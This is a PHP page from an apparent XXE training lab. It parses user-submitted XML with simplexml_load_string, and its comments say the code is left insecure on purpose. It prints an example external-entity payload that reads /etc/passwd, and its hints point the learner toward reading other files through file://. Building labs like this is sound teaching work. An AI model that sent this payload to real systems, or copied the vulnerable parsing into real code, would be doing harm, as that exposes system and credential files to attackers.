<?php include '../includes/header.php'; ?>

        <div class="main-content">
            <h2>Level 1 - Basic XXE</h2>
            
            <div style="margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; border-left: 3px solid #007bff;">
                <h3>📖 Lab Description</h3>
                <p>
                    This lab demonstrates a basic XXE vulnerability. The server accepts XML input and parses it 
                    using PHP's <code>simplexml_load_string()</code> function with default settings, which allows 
                    external entity expansion.
                </p>
            </div>

            <div class="xml-form">
                <h3>XML Input:</h3>
                <form method="POST">
                    <textarea name="xml_input" placeholder="Enter XML here..."><?php 
                        echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY hello "World">
]>
<data>
    <message>Hello &hello;!</message>
</data>'); 
                    ?></textarea>
                    <br>
                    <button type="submit">Parse XML</button>
                </form>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_input'])) {
                $xml = $_POST['xml_input'];
                
                // Vulnerable XML parsing - intentionally insecure!
                // The simplexml_load_string function with default settings allows entity expansion
                $result = simplexml_load_string($xml);
                
                if ($result) {
                    echo '<div class="results">';
                    echo '<h3>✅ Parsing Results:</h3>';
                    echo '<pre>' . htmlspecialchars(print_r($result, true)) . '</pre>';
                    echo '</div>';
                } else {
                    echo '<div class="error">';
                    echo '<h3>❌ Parsing Error:</h3>';
                    echo '<pre>' . htmlspecialchars(libxml_get_last_error()->message) . '</pre>';
                    echo '</div>';
                }
            }
            ?>

            <div class="examples">
                <h3>💡 Example Payloads:</h3>
                
                <h4>Basic Internal Entity:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY hello "World">
]>
<data>
    <message>Hello &hello;!</message>
</data>'); ?></pre>
                
                <h4>External Entity (File Reading):</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>
    <content>&file;</content>
</data>'); ?></pre>
            </div>

            <div class="hints">
                <h3>💡 Hints:</h3>
                <ul>
                    <li>The server is using PHP's simplexml_load_string() without any security settings</li>
                    <li>Try creating your own entity definitions in the DTD</li>
                    <li>External entities use the SYSTEM keyword</li>
                    <li>Try accessing different files using file:// protocol</li>
                </ul>
            </div>
        </div>

<?php include '../includes/footer.php'; ?>
